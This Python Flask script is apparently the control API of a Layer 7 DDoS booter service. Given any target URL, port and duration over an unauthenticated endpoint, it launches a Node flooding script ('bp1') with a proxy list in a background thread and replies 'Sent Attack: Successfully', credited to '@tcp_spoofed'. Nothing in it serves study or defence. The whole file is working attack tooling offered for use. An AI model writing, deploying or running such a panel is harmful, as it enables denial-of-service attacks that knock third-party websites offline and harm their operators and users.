from flask import Flask, request, jsonify
import subprocess
import threading
import requests

app = Flask(__name__)



@app.route('/api', methods=['GET'])

def execute_tool():
  try:
    methods = request.args.get('methods', 'Methods')
    url = request.args.get('url', '')
    port = request.args.get('port', '')
    time = request.args.get('time', '')
    if not (methods and url and port and time):
      return jsonify({
          "Note": "Vui long dien day du thong tin",
          "Status": "error"
      }), 400

    valid_methods = ["tls"]
    if methods not in valid_methods:
      return jsonify({
          "Methods": "Not Found",
          "Status": "error"
      }), 400

    def execute_command():
      if methods == "tls":
        command = ['node', 'bp1', url, time, '128', '9', 'bp2.txt']
      else:
        print(f"Phương thức không xác định: {methods}")
        return
      try:
          result = subprocess.run(command,
                                  capture_output=True,
                                  text=True,
                                  timeout=120)
          print(result.stdout)
      except subprocess.TimeoutExpired:
        print("Lệnh thực thi đã hết thời gian.")
      except Exception as e:
        print(f"Lỗi khi thực thi lệnh: {e}")

    threading.Thread(target=execute_command).start()
    result = {
        'Sent Attack': 'Successfully',
        'time': time,
        'Url': url,
        'Methods': methods,
        'Port': port,
        'Api Ddos Layer 7 By': '@tcp_spoofed'
    }
    return jsonify(result)
  except Exception as e:
    print(e)
    return jsonify({'error': 'Lỗi máy chủ nội bộ'}), 500


if __name__ == '__main__':
  app.run(host='0.0.0.0', port=8081, debug=True)
